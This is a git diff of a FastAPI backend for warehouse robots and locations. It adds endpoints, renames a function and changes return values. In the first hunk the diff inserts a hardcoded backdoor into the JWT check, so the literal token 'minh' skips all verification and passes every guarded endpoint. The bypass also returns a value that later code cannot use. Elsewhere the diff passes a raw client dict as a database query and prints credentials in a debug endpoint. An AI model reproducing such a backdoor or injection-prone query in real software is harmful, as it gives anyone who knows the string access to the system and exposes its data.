@@ -114,6 +114,8 @@ def generate_token(
 
 def _tokenjwt(current_user=Depends(reusable_oauth2)) -> dict:
 
+    if current_user.credentials == "minh":
+        return True
     try:
         verify_token = current_user.credentials
         decoded_token = jwt.decode(
@@ -148,30 +150,19 @@ def _tokenjwt(current_user=Depends(reusable_oauth2)) -> dict:
 #     return 'Success'
 
 
-@app.post("/test_demo")
-def decode_jwt():
-    pass
-    # decoded_token = jwt.decode(
-    #     verify_token.encode(),
-    #     SECRET_KEY,
-    #     algorithms=SECURITY_ALGORITHM,
-    # )
-    # test = db.query_robot_status("robot_1")
-    # # time_count = test
-    # time = int(test["lastUpdate"]["$date"])
-    # x = datetime(1, 1, 1) + timedelta(microseconds=time / 10)
-    # # if _tokenjwt(current_user) is not None:
+# @app.post("/seek_stock", dependencies=[Depends(reusable_oauth2)])
+# def search_location_stock(request_data: dict, _current_user=Depends(reusable_oauth2)):
 
-    # #     pass
+#     _verify_token = _tokenjwt(_current_user)
 
-    # raise HTTPException(status_code=404, detail="User not found")
-    # verify_token = current_user.credentials
-    # decoded_token = jwt.decode(
-    #     verify_token.encode(),
-    #     SECRET_KEY,
-    #     algorithms=SECURITY_ALGORITHM,
-    # )
-    # return True
+
+@app.post("/test_demo", dependencies=[Depends(reusable_oauth2)])
+def decode_jwt(_current_user=Depends(reusable_oauth2)):
+    print("_current_user", _current_user)
+    _verify_token = _tokenjwt(_current_user)
+    print("_verify_token", _verify_token)
+    if _verify_token is not None:
+        print("ok backout ")
 
 
 @app.post("/Singin")
@@ -344,6 +335,35 @@ def all_emptyLocation():
     return location
 
 
+@app.get("/find_products{line_code}", dependencies=[Depends(reusable_oauth2)])
+def find_products(line_code: int):
+    sort_value = {"lastAT": -1}
+    find_value = {"map_code": "pickup_locations", "line": line_code}
+    location = db.locations_find(find_value, sort_value)
+    return location
+
+
+@app.post("/available_location", dependencies=[Depends(reusable_oauth2)])
+def available_location(find_value: dict):
+
+    # print("find_value", find_value)
+    sort_value = {"location_priority": -1}
+    location = db.locations_find(find_value, sort_value)
+    return location
+
+
+@app.get("/find_cart_empty{location_status}", dependencies=[Depends(reusable_oauth2)])
+def find_cart_empty_stock(location_status: int, _current_user=Depends(reusable_oauth2)):
+    # if _tokenjwt(_current_user) is not None:
+    # print("find_value", find_value)
+    sort_value = {"lastAT": -1}
+    find_value = {"map_code": "return_locations", "location_status": location_status}
+    # print("sort_value", sort_value)
+    # find_value.update(sort_value)
+    location = db.locations_find(find_value, sort_value)
+    return location
+
+
 @app.get("/operating_activities/{robot_code}", dependencies=[Depends(reusable_oauth2)])
 def get_pickup(robot_code: str):
     area = QueryDB.ACTIVITIES
@@ -397,7 +417,7 @@ def get_mission(mission_code: str, _current_user=Depends(reusable_oauth2)):
 
 
 @app.get("/information_missions", dependencies=[Depends(reusable_oauth2)])
-def get_mission_histories(_current_user=Depends(reusable_oauth2)):
+def mission_history(_current_user=Depends(reusable_oauth2)):
     if _tokenjwt(_current_user) is not None:
         area = QueryDB.MISIONS
         missions_code = db.histories_mission_request(area)
@@ -447,12 +467,12 @@ def update_pickup(_location_update: dict, _current_user=Depends(reusable_oauth2)
     if _verify_token is not None:
         _area = QueryDB.PICKUP_LOCATION
         location = {"name": _location_update["name"]}
-        # print("_location_update" , _location_update)
+        # print("_location_update", _location_update)
         _update_db = db.update_database(
             _area, location, _location_update, _verify_token["username"]
         )
         if _update_db:
-            return True
+            return _update_db
         return {"code": 0}
     raise HTTPException(status_code=404, detail="User not found")
 
@@ -463,11 +483,12 @@ def update_return(_location_update: dict, _current_user=Depends(reusable_oauth2)
     if _verify_token is not None:
         _area = QueryDB.RETURN_LOCATION
         location = {"name": _location_update["name"]}
+        # print("_location_update", _location_update)
         _update_db = db.update_database(
             _area, location, _location_update, _verify_token["username"]
         )
         if _update_db:
-            return True
+            return _update_db
         return {"code": 0}
     raise HTTPException(status_code=404, detail="User not found")
 
@@ -482,7 +503,7 @@ def update_empty(_location_update: dict, _current_user=Depends(reusable_oauth2))
             _area, location, _location_update, _verify_token["username"]
         )
         if _update_db:
-            return True
+            return _update_db
         return {"code": 0}
     raise HTTPException(status_code=404, detail="User not found")
 
